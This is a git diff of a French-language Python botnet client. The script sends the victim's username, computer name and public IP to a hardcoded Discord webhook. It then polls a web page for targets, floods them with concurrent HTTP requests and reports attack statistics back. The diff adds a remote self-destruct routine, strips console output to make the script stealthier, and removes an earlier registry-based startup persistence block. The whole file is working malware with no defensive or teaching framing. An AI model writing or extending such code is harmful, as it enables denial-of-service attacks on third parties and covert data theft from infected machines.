@@ -11,10 +11,20 @@ headers = {
     "Connection": "keep-alive",
 }
 
+import os
+
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 
 webhook = "https://discordapp.com/api/webhooks/1445805470639067311/DdrHhMfsUhJbpH2bN8DBz_4-WblD3jlCgQtpLjS_4t5vjq6vuoURh0tGWhAIY2quGASi"
 
 valeur = ""
+ip_public = ""
+alerte_activée = ""
+ip_cible = ""
+previous_alerte = None
+previous_ip = None
 
 import platform
 import getpass
@@ -23,40 +33,17 @@ import socket
 ordi = platform.uname()
 hostname = socket.gethostname()
 
-if script_path is None:
-    script_path = os.path.abspath(__file__)
-
-    # Chemin vers python.exe utilisé pour lancer ton script
-    python_exe = sys.executable
-
-    # Commande complète à lancer au démarrage
-    command = f'"{python_exe}" "{script_path}"'
-
-    # On ouvre la clé Run dans le registre
-    key = winreg.OpenKey(
-        winreg.HKEY_CURRENT_USER,
-        r"Software\Microsoft\Windows\CurrentVersion\Run",
-        0,
-        winreg.KEY_SET_VALUE
-    )
-
-    # On écrit la commande dans la clé
-    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)
-    winreg.CloseKey(key)
-
-ip = requests.get("https://api.ipify.org").text
+ip_public = requests.get("https://api.ipify.org").text
 name = (
-    f"Nom de l'ordinateur : {ordi.node}\n"
     f"Utilisateur actuel : {getpass.getuser()}\n"
     f"Nom de l'ordinateur : {ordi.node}\n"
     f"Adresse IP : {socket.gethostbyname(hostname)}\n"
-    f"Adresse IP publique {ip}"
+    f"Adresse IP publique {ip_public}\n"
     )
 
 requests.post(webhook, json={"content": name})
 
 def envoyer():
-    """Récupère la valeur de l'input toutes les 20 sec."""
     global valeur
 
     try:
@@ -71,27 +58,95 @@ def envoyer():
             # Si la valeur a changé et n'est pas vide → action
             if nouvelle_val != "":
                 valeur = nouvelle_val
-                print("Nouvelle valeur détectée :", valeur)
                 requests.post(webhook, json={"content": f"Valeur trouvée : {valeur}"})
                 ddos_attack()
-
-            else:
-                print("Aucune action. Valeur vide ou identique.")
 
     except Exception as e:
         print("Erreur :", e)
 
 
 def loop_check():
-    """Boucle infinie — vérifie toutes les 20 sec."""
-    print("Démarrage du système de surveillance...")
     while True:
         envoyer()
+        alerte()
         time.sleep(20)  # ← 20 secondes
 
+def alerte():
+    global previous_alerte, alerte_activée
+
+    try:
+        response = requests.get(url, headers=headers, verify=False)
+        soup = BeautifulSoup(response.text, "html.parser")
+
+        champ_alerte = soup.find("input", {"id": "alerte"})
+        if champ_alerte:
+            message_alerte = champ_alerte.get("value").strip()
+
+            if message_alerte != "" and message_alerte != previous_alerte:
+                previous_alerte = message_alerte
+                alerte_activée = message_alerte
+                ip()
+
+    except Exception as e:
+        print("Erreur (alerte) :", e)
 
 
 
+def ip():
+    global ip_public, previous_ip, ip_cible
+
+    try:
+        response = requests.get(url, headers=headers, verify=False)
+        soup = BeautifulSoup(response.text, "html.parser")
+
+        champ_ip = soup.find("input", {"id": "ip"})
+        if champ_ip:
+            ip_cible_nouveau = champ_ip.get("value").strip()
+
+            if ip_cible_nouveau != ip_public:
+                requests.post(webhook, json={"content": f"L'ip ne correspond pas à l'IP publique : {ip_public}"})
+                return
+
+            confirmer(ip_cible_nouveau)
+
+    except Exception as e:
+        print("Erreur (ip) :", e)
+
+
+
+def confirmer(ip_cible_nouveau):
+    global previous_ip, ip_cible
+
+    if ip_cible_nouveau != "" and ip_cible_nouveau != previous_ip:
+        previous_ip = ip_cible_nouveau
+        ip_cible = ip_cible_nouveau
+
+        try:
+            requests.post(webhook, json={"content": f" Botnet détruit à la demande de l'IP cible : {ip_cible}"})
+            destroy()
+        except ValueError:
+            print("IP cible invalide :", ip_cible)
+
+
+import os
+import sys
+import subprocess
+
+def destroy():
+    script_path = os.path.abspath(sys.argv[0])
+
+    # Pour Windows
+    if os.name == "nt":
+        subprocess.Popen(
+            f'del "{script_path}"',
+            shell=True,
+        )
+    
+    # Pour Linux/Mac
+    else:
+        subprocess.Popen(["rm", script_path])
+
+    sys.exit()
 
 from concurrent.futures import ThreadPoolExecutor
 import asyncio
@@ -101,13 +156,9 @@ import aiohttp
 async def async_ddos_attack():
     global valeur
 
-    if valeur == "":
-        print("pas possible")
-
     nombre_requetes = int(500)
     concurrence = min(100000, nombre_requetes)  # Limiter à 500 connexions simultanées
     
-    print(f"Démarrage de l'attaque avec {concurrence} connexions simultanées...")
     start_time = time.time()
     
  
@@ -141,9 +192,13 @@ async def async_ddos_attack():
     
     duration = time.time() - start_time
     
-    print(f"\nAttaque terminée en {duration:.2f} secondes")
-    print(f"Requêtes réussies : {successful}/{nombre_requetes}")
-    print(f"Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde")
+    temps = f"\nAttaque terminée en {duration:.2f} secondes"
+    cible = f"Requêtes réussies : {successful}/{nombre_requetes}"
+    vitesse = f"Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde"
+    requests.post(webhook, json=temps)
+    requests.post(webhook, json=cible)
+    requests.post(webhook, json=vitesse)
+
 
 def ddos_attack():
     global valeur 
@@ -153,8 +208,8 @@ def ddos_attack():
     except ImportError:
         print("Module aiohttp non trouvé. Utilisation de la méthode plus lente.")
 
-        nombre_requetes = int(input("Combien de requêtes envoyer ? "))
-        max_workers = min(200, nombre_requetes)
+        nombre_requetes = int(500)
+        max_workers = min(10000, nombre_requetes)
         
         start_time = time.time()
         success_count = 0
@@ -185,12 +240,15 @@ def ddos_attack():
                     print(f"Progression : {int((i+1)/nombre_requetes*100)}% ({i+1}/{nombre_requetes})")
         
         duration = time.time() - start_time
-        print(f"\nAttaque terminée en {duration:.2f} secondes")
-        print(f"Requêtes réussies : {success_count}/{nombre_requetes}")
-        print(f"Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde")
+        
+        temps = f"\nAttaque terminée en {duration:.2f} secondes"
+        cible = f"Requêtes réussies : {success_count}/{nombre_requetes}"
+        vitesse = f"Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde"
+        requests.post(webhook, json=temps)
+        requests.post(webhook, json=cible)
+        requests.post(webhook, json=vitesse)
 
 
 
 # Appel de la fonction
-
 loop_check()
